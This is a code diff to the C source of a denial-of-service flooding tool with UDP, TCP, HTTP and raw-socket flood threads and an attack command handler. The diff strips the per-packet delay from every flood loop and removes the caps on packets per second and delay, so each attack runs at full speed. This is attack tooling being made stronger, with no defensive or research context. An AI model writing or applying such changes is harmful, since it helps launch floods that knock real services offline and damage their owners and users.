@@ -231,8 +231,6 @@ void *udp_flood(void *arg) {
 
     packet = malloc(packet_size);
     end_time = time(NULL) + args->duration;
-    int delay_us = 1000000 / args->pps;
-    if (delay_us < 1) delay_us = 1;
 
     while (attack_running && time(NULL) < end_time) {
         random_payload(packet, packet_size);
@@ -242,7 +240,6 @@ void *udp_flood(void *arg) {
             packets_sent++;
             bytes_sent += result;
         }
-        usleep(delay_us);
     }
 
     free(packet);
@@ -286,8 +283,6 @@ void *udp_raw_flood(void *arg) {
     }
 
     end_time = time(NULL) + args->duration;
-    int delay_us = 1000000 / args->pps;
-    if (delay_us < 1) delay_us = 1;
 
     while (attack_running && time(NULL) < end_time) {
         ip_header = (struct iphdr *)packet;
@@ -320,7 +315,6 @@ void *udp_raw_flood(void *arg) {
             packets_sent++;
             bytes_sent += result;
         }
-        usleep(delay_us);
     }
 
     close(sockfd);
@@ -347,8 +341,6 @@ void *tcp_flood(void *arg) {
     }
 
     end_time = time(NULL) + args->duration;
-    int delay_us = 1000000 / args->pps;
-    if (delay_us < 1) delay_us = 1;
 
     while (attack_running && time(NULL) < end_time) {
         int conn = socket(AF_INET, SOCK_STREAM, 0);
@@ -361,7 +353,6 @@ void *tcp_flood(void *arg) {
             packets_sent++;
             bytes_sent += packet_size;
         }
-        usleep(delay_us);
     }
 
     free(packet);
@@ -403,8 +394,6 @@ void *tcp_raw_flood(void *arg) {
     }
 
     end_time = time(NULL) + args->duration;
-    int delay_us = 1000000 / args->pps;
-    if (delay_us < 1) delay_us = 1;
 
     while (attack_running && time(NULL) < end_time) {
         ip_header = (struct iphdr *)packet;
@@ -440,7 +429,6 @@ void *tcp_raw_flood(void *arg) {
             packets_sent++;
             bytes_sent += result;
         }
-        usleep(delay_us);
     }
 
     close(sockfd);
@@ -461,8 +449,6 @@ void *http_flood(void *arg) {
     }
 
     end_time = time(NULL) + args->duration;
-    int delay_us = 1000000 / args->pps;
-    if (delay_us < 1) delay_us = 1;
 
     while (attack_running && time(NULL) < end_time) {
         build_http_request(http_request, args->host, args->path, sizeof(http_request), ua_counter++);
@@ -475,7 +461,6 @@ void *http_flood(void *arg) {
             packets_sent++;
             bytes_sent += strlen(http_request);
         }
-        usleep(delay_us);
     }
 
     return NULL;
@@ -518,8 +503,6 @@ void *http_raw_flood(void *arg) {
     }
 
     end_time = time(NULL) + args->duration;
-    int delay_us = 1000000 / args->pps;
-    if (delay_us < 1) delay_us = 1;
 
     while (attack_running && time(NULL) < end_time) {
         build_http_request(http_request, args->host, args->path, sizeof(http_request), ua_counter++);
@@ -564,7 +547,6 @@ void *http_raw_flood(void *arg) {
             packets_sent++;
             bytes_sent += result;
         }
-        usleep(delay_us);
     }
 
     close(sockfd);
@@ -610,11 +592,8 @@ void start_attack(char *cmd) {
     if (parsed < 8) delay = DEFAULT_DELAY;
     
     if (threads > MAX_THREADS) threads = MAX_THREADS;
-    if (pps > 1000000) pps = 1000000;
     if (size > 65507) size = 65507;
     if (size < 64) size = 64;
-    if (delay < 0) delay = 0;
-    if (delay > 10000) delay = 10000;
     
     attack_running = 1;
     packets_sent = 0;
